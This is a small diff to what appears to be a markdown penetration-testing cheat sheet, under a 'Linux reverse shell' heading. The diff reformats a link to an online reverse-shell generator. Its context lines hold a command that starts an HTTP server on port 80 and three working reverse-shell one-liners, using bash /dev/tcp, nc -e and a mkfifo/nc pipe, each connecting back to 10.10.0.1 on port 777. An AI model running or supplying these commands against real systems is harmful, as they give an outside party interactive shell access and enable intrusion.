@@ -2,7 +2,9 @@ sudo python3 -m http.server 80
 ## Linux reverse shell
 ```bash
 https://weibell.github.io/reverse-shell-generator/
-[`this is code`](https://weibell.github.io/reverse-shell-generator/)
+<pre>
+<a href="https://weibell.github.io/reverse-shell-generator/">Something</a>
+</pre>
 bash -i >& /dev/tcp/10.10.0.1/777 0>&1
 nc -e /bin/bash 10.10.0.1 777
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 777 \>/tmp/f
